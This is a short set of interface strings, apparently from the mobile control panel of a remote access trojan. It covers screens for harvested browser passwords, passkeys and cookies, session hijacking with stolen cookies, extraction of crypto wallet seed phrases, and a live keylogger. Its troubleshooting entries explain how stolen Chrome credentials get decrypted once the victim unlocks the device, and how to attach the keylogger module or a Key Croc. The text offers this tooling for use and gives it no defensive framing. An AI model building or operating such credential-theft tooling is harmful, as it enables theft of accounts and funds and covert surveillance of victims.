creds.browser.table.title: Browser Passwords & Passkeys
creds.browser.table.howTo: All harvested browser credentials per target. Masked by default — tap to reveal (biometric re-prompt if enabled), long-press for multi-select. Cookies export as Netscape or JSON; 'open live session' launches the in-app browser with the target's cookies to test session validity.

troubleshooting.cause: Chrome decryption requires the target device to have been unlocked since capture
troubleshooting.fix: Wait — the harvest queue re-runs automatically when the RAT reports an unlock event.

troubleshooting.symptom: Passkey row won't export key material
troubleshooting.cause: FIDO2/Android passkeys are hardware-bound by design
troubleshooting.fix: Expected — metadata reveals relying party and assertion history; only synced (Google Password Manager) passkeys can be extracted.

creds.wallet.widget.title: Crypto Wallets
creds.wallet.widget.howTo: Addresses, seed phrases and keyfiles per harvested wallet. Seed reveal requires double-tap + biometric. Balance lookup is OFF by default (querying explorers can de-anonymize interest in a wallet) — enable per-wallet.

creds.keylog.manager.title: Keylogger
creds.keylog.manager.howTo: Live tail of captured keystrokes per app, password-context entries highlighted. 'Promote' moves a captured password into the device credentials table.

troubleshooting.cause: Keylogger requires RAT accessibility module or Key Croc link
troubleshooting.fix: Enable from the RAT dashboard target drawer → Keylogger, or attach Key Croc (Payloads dashboard).
